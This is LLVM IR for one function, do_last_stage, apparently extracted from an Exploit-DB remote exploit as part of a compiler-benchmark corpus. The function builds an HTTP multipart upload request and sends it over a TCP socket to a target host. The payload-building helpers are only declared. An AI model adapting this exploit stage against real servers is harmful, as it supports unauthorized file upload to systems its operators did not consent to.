; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_805.c_do_last_stage.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_805.c_do_last_stage.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@SENDBUFSIZE = common dso_local global i32 0, align 4
@UPLOADME = common dso_local global i32 0, align 4
@boundary = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"[-] Can not Connect to server!\0A\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"send\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_last_stage(i8* %0, i16 signext %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i8* %2, i8** %6, align 8
  store i32 0, i32* %8, align 4
  %14 = load i32, i32* @SENDBUFSIZE, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %10, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %11, align 8
  %18 = load i32, i32* @UPLOADME, align 4
  store i32 %18, i32* %13, align 4
  %19 = trunc i64 %15 to i32
  %20 = call i32 @bzero(i8* %17, i32 %19)
  %21 = load i32, i32* %13, align 4
  %22 = load i8*, i8** %6, align 8
  %23 = call i8* @make_http_content(i32 %21, i8* %22)
  store i8* %23, i8** %12, align 8
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* @boundary, align 4
  %26 = call i8* @make_request_header(i8* %24, i32 %25, i32 0)
  %27 = call i32 @strcat(i8* %17, i8* %26)
  %28 = load i8*, i8** %12, align 8
  %29 = call i32 @strcat(i8* %17, i8* %28)
  %30 = load i32, i32* @AF_INET, align 4
  %31 = load i32, i32* @SOCK_STREAM, align 4
  %32 = load i32, i32* @IPPROTO_TCP, align 4
  %33 = call i32 @socket(i32 %30, i32 %31, i32 %32)
  store i32 %33, i32* %7, align 4
  %34 = load i32, i32* %7, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %39

36:                                               ; preds = %3
  %37 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %38 = call i32 @exit(i32 1) #4
  unreachable

39:                                               ; preds = %3
  %40 = load i32, i32* %7, align 4
  %41 = load i32, i32* @SOL_SOCKET, align 4
  %42 = load i32, i32* @SO_REUSEADDR, align 4
  %43 = bitcast i32* %8 to i8*
  %44 = call i64 @setsockopt(i32 %40, i32 %41, i32 %42, i8* %43, i32 4)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %51

46:                                               ; preds = %39
  %47 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %48 = load i32, i32* %7, align 4
  %49 = call i32 @close(i32 %48)
  %50 = call i32 @exit(i32 1) #4
  unreachable

51:                                               ; preds = %39
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %53 = call i32 @memset(i32* %52, i8 signext 0, i32 8)
  %54 = load i32, i32* @AF_INET, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %54, i32* %55, align 4
  %56 = load i16, i16* %5, align 2
  %57 = call i32 @htons(i16 signext %56)
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %57, i32* %58, align 4
  %59 = load i8*, i8** %4, align 8
  %60 = call i32 @get_host_ip(i8* %59)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %62 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %61, i32 0, i32 0
  store i32 %60, i32* %62, align 4
  %63 = load i32, i32* %7, align 4
  %64 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %65 = call i64 @connect(i32 %63, %struct.sockaddr* %64, i32 16)
  %66 = icmp ne i64 %65, 0
  br i1 %66, label %67, label %71

67:                                               ; preds = %51
  %68 = load i32, i32* @stderr, align 4
  %69 = call i32 @fprintf(i32 %68, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %70 = call i32 @exit(i32 1) #4
  unreachable

71:                                               ; preds = %51
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @strlen(i8* %17)
  %74 = call i64 @send(i32 %72, i8* %17, i32 %73, i32 0)
  %75 = icmp slt i64 %74, 0
  br i1 %75, label %76, label %79

76:                                               ; preds = %71
  %77 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %78 = call i32 @exit(i32 -1) #4
  unreachable

79:                                               ; preds = %71
  %80 = load i32, i32* %7, align 4
  %81 = call i32 @close(i32 %80)
  %82 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %82)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i8* @make_http_content(i32, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i8* @make_request_header(i8*, i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @memset(i32*, i8 signext, i32) #2

declare dso_local i32 @htons(i16 signext) #2

declare dso_local i32 @get_host_ip(i8*) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
